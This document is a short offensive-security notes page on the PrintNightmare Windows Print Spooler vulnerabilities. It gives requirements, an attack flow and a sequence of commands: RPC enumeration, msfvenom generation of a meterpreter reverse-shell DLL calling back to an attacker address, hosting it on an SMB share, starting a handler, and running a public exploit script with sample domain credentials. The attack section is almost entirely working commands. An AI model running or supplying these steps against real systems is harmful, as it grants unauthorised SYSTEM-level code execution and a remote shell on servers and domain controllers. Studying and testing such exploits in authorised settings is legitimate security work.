# PrintNightmare

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**PrintNightmare**</mark> is the nickname given to two vulnerabilities (**CVE-2021-34527** and **CVE-2021-1675**) found in the Print Spooler service that runs on all Windows operating systems.&#x20;

> Basically it's just <mark style="color:purple;">**RCE**</mark> as **SYSTEM**, via printer driver **DLL injection** through RPC interface of Print Spooler.

<mark style="color:red;">**Print Spooler**</mark> is a Microsoft <mark style="color:purple;">**built-in service that manages printing jobs**</mark>. It is enabled by default and runs within the SYSTEM context.

* **MS-RPRN** – The main protocol for managing printers and print jobs remotely. It handles tasks like listing printers, sending print jobs, and configuring settings.
* **MS-PAR** – Adds support for asynchronous operations to improve performance. It allows non-blocking calls, like getting print job updates without waiting.
* **MS-PAN** – An extension to MS-RPRN that supports newer features. It enables enhanced printer capabilities used in modern Windows systems.

### <mark style="color:blue;">Requirements</mark>

* Print Spooler enabled on target (e.g., DC or file server)
* RPC/SMB access (ports 135, 445)
* Attacker has **write access** to printer driver path

## <mark style="color:yellow;">FLOW</mark>

1. Create a malicious DLL
2. Host SMB share, or put DLL into accessible share
3. Trigger DLL install via RPC call
4. Catch reverse shell or payload (Or do anything depends on your payload)

## <mark style="color:yellow;">LINUX</mark>

#### MS-RPRN Enum

```bash
rpcdump.py @13.13.13.13 | egrep 'MS-RPRN|MS-PAR'
```

#### DLL Payload Generation

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=13.13.13.13 LPORT=8080 -f dll > defnotsusfile.dll
```

#### Creating a share

```bash
sudo smbserver.py -smb2support CompData /path/to/defnotsusfile.dll
```

#### Turning on multi/handler

```bash
msf >> use exploit/multi/handler
...
```

#### Running exploit [\[LINK\]](https://github.com/cube0x0/CVE-2021-1675)

```bash
sudo python3 CVE-2021-1675.py militech.local/sreed:password123@13.13.13.13 '\\13.13.13.13\CompData\defnotsusfile.dll'
```

## <mark style="color:yellow;">RESOURCES</mark>

{% embed url="https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare" %}
